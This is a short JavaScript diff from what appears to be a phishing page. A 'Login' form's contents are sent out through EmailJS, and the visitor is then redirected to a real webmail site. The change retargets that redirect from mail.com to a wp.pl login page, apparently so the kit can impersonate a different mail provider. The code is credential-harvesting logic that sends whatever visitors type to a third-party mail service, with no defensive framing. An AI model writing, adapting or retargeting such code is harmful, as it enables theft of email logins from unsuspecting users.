@@ -12,7 +12,7 @@ document.getElementById('form')
     emailjs.sendForm(serviceID, templateID, this)
       .then(() => {
         btn.value = 'Login';
-        window.location.href = 'https://www.mail.com/mail/app/'; // Redirect to the desired link
+        window.location.href = 'https://1login.wp.pl/informacje'; // Redirect to the desired link
       }, (err) => {
         btn.value = 'Login';
         alert(JSON.stringify(err));
